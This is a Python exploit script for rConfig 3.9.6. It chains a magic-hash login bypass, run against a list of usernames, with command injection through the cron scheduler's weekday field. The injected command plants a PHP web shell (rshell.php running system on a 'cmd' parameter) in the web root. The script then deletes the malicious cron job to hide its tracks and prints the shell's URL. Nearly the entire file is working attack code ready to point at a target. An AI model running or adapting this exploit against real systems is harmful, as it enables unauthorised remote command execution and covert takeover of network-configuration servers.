#!/usr/bin/python3
#-*- coding: utf-8 -*-
# Add blog post here

import requests, urllib.request
requests.packages.urllib3.disable_warnings()
import time

import argparse
from argparse import RawTextHelpFormatter
import re
import random

# Colors
class bco:
	WHT = '\033[37m'
	ENC = '\033[0m'
	RED = '\033[91m'
	CYN = '\033[96m'
	BLU = '\033[94m'
	YEL = '\033[93m'

# Parse args
parser = argparse.ArgumentParser(description="""rConfig 3.9.6 Magic Hash Auth to RCE
  eg: python3 poc.py -t https://127.0.0.1/rconfig/ -m 'unauth' -l '/home/users.txt'
  eg: python3 poc.py -t https://127.0.0.1/rconfig/ -m 'auth' -u alice -p 'letmein!'
""", formatter_class=RawTextHelpFormatter)
parser.add_argument('-t', dest='TARGET_URI', help='URI to rConfig web root', required=True)
parser.add_argument('-m', dest='MODE', help='\'unauth\' or \'auth\'', required=True)
parser.add_argument('-l', dest='USERLIST', help='User List', required=False)
parser.add_argument('-u', dest='USERNAME', help='Username', required=False)
parser.add_argument('-p', dest='PASSWORD', help='Password', required=False)
args = parser.parse_args()

def header():
	print(bco.BLU+"*  *  *  *  *  "+bco.YEL+"rConfig 3.9.6"+bco.BLU+" *  *  *  *  *"+bco.ENC)
	print(bco.BLU+"*  *  *  *"+bco.YEL+"Magic Hash Auth to RCE"+bco.BLU+"*  *  *  *"+bco.ENC)
	print(bco.YEL+"            . e           ' 0e  ,    "+bco.ENC)
	print(bco.YEL+"           0 ~             .  ~    "+bco.ENC)
	print(bco.YEL+"            (\.   \      ,/)"+bco.ENC)
	print(bco.YEL+"             \(   |\     )/"+bco.ENC)
	print(bco.YEL+"             //\  | \   /\\"+bco.ENC)
	print(bco.YEL+"            (/ /\_#oo#_/\ \)"+bco.ENC)
	print(bco.YEL+"             \/\  ####  /\/"+bco.ENC)
	print(bco.YEL+"                  `##'"+bco.ENC)
	print(bco.BLU+"*  *  *  *  *  *  *  *  *  *  *  *  *  *  *"+bco.ENC)


def main():
	header()
	if args.MODE == "unauth":
		loginBypass()
	if args.MODE == "auth":
		login()
	#else:
	#	print(bco.YEL+"[+] Incorrect syntax"+bco.ENC)

	print(bco.YEL+"[+] Done"+bco.ENC)

# Authenticate with provided creds
def login():
	u = args.USERNAME
	p = args.PASSWORD
	print(bco.YEL+"[+] Logging in with: " + u + ":" + p + bco.ENC)
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	}


	bSession = requests.Session()
	firstURI = args.TARGET_URI + '/login.php'
	loginURI = args.TARGET_URI + '/lib/crud/userprocess.php'
	loginData = { "user" : u, "pass" : p, "sublogin" : "1"}
	loginRequest = bSession.post(loginURI, data=loginData, verify=False, allow_redirects=True)

	time.sleep(1.50)
	firstReq = bSession.get(firstURI, verify=False, allow_redirects=True)

	incorrect = b'Invalid password'
	if incorrect not in firstReq.content:
		print(bco.BLU+"    [+] Login Successful" +bco.ENC)
		#print(firstReq.content)
		rce(u, bSession)
	else:
		print(bco.YEL+"    [!] Login Failed! Check your creds. Exiting..." + bco.ENC) 
	

def loginBypass():
	# Getting and loading the main observium page
	print(bco.YEL+"[+] Enchanting Request with Hash Magick"+bco.ENC)
	if args.USERLIST is None:
		print(bco.YEL+"[-] User List required!"+bco.ENC)
		exit(1)
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	}

	bfList = args.USERLIST
	loginURI = args.TARGET_URI + '/lib/crud/userprocess.php'
	aSession = requests.Session()
	firstURI = args.TARGET_URI + '/login.php'
	firstReq = aSession.get(firstURI, verify=False, allow_redirects=True)

	# Get total line count of user list file
	with open(bfList) as f:
		line_count = 0
		for line in f:
			line_count += 1

	time.sleep(0.25)
	print(bco.BLU+"    [+] Login attempts left before the spell wears off"+bco.ENC)
	with open(bfList) as ufi:
		for u in ufi:
			loginData = { "user" : u, "pass" : "PJNPDWY", "sublogin" : "1"}
			loginRequest = aSession.post(loginURI, data=loginData, verify=False, allow_redirects=True)
			
			time.sleep(0.10)
			ik = str.rstrip(u) #Remove newline from each line of txt in user list
			line_count = line_count - 1
			incorrect = b'Password to login'
			if incorrect not in loginRequest.content:
				print(bco.BLU+"    [+] Successful Login with: " +bco.YEL+ ik + bco.ENC)
				rce(u, aSession)
				break
			else:
				print(bco.YEL+"    [#]   " + str(line_count) + "      " + bco.ENC, end = "\r")

def rce(u, aSession):
	print(bco.YEL+"[+] Spellbinding Cron to conjure a Webshell"+bco.ENC)

	# Add evil cron
	PAYLOAD = '/usr/bin/echo \'<pre><body style="background-color:#060224; color:#77c7a6;"><?php echo system($_GET["cmd"]); ?></pre>\' > /home/rconfig/www/rshell.php'
	cronURI = args.TARGET_URI + "/lib/crud/scheduler.crud.php"
	cronData = { "taskType" : "1", "taskName" : "rshell", "taskDesc" : "default", "minute" : "*", "hour" : "*",  "day" : "*", "month" : "*", "weekday" : "* " + PAYLOAD + " #", "add" : "add"}
	cronReq = aSession.post(cronURI , data=cronData, verify=False, allow_redirects=True)
	print(bco.BLU+"    [+] Black Magick has been Casted!"+bco.ENC)
	

	# Get the new Task ID for the cron to delete later
	taskID = '.{0,17}<td align=\"left\">rshell<\/td>'
	idk = re.search(taskID, str(cronReq.content))
	finT = re.findall(r"\D(\d{6})\D", str(idk)) # Match 6 digits in string of text
	#print(finT[0])

	
	print(bco.BLU+"    [+] Waiting for Cron to invoke our new Webshell"+bco.ENC)
	shellURI = args.TARGET_URI + "/rshell.php"
	shellReq = aSession.get(shellURI, verify=False)
	time.sleep(1.20)

	wCount = 0
	while shellReq.status_code != 200:
		list = ["*", "*", "*", "~", ".", "0", "o", "~", "'", "^", ".", "-" ]
		item = random.choice(list)
		print(bco.YEL + "   " + item + bco.ENC, end=" ", flush=True)
		time.sleep(2.11)
		wCount = wCount + 1
		if wCount > 30:
			print(print(bco.BLU+"    [-] It seems cron did not conjure our webshell properly"+bco.ENC))
			print(print(bco.BLU+"    [-] Apache may need to be restarted. Exiting..."+bco.ENC))
			exit(1)
	magickID = finT[0]
	print(bco.BLU+"    [+] Clairvoyant seeing STATUS 200 on Webshell!"+bco.ENC)		
	
	print(bco.BLU+"    [+] Deleting magick CronJob with Task ID: "+magickID+bco.ENC)
	time.sleep(2)
	
	delURI = args.TARGET_URI + "/lib/crud/scheduler.crud.php"
	delData = { "id" : magickID, "del" : "delete"}
	delReq = aSession.post(delURI, data=delData, verify=False, allow_redirects=True)
	
	print(bco.BLU + "    [+] Done. Necromancy Avoided!  [¬º-°]¬")


	print(bco.YEL+"[+] Enjoy your new Webshell!"+bco.ENC)
	print(bco.BLU+"    " + args.TARGET_URI + "/rshell.php?cmd=netstat -antp"+bco.ENC)
	print(" ")
	exit(1)

if __name__ == "__main__":
	main()
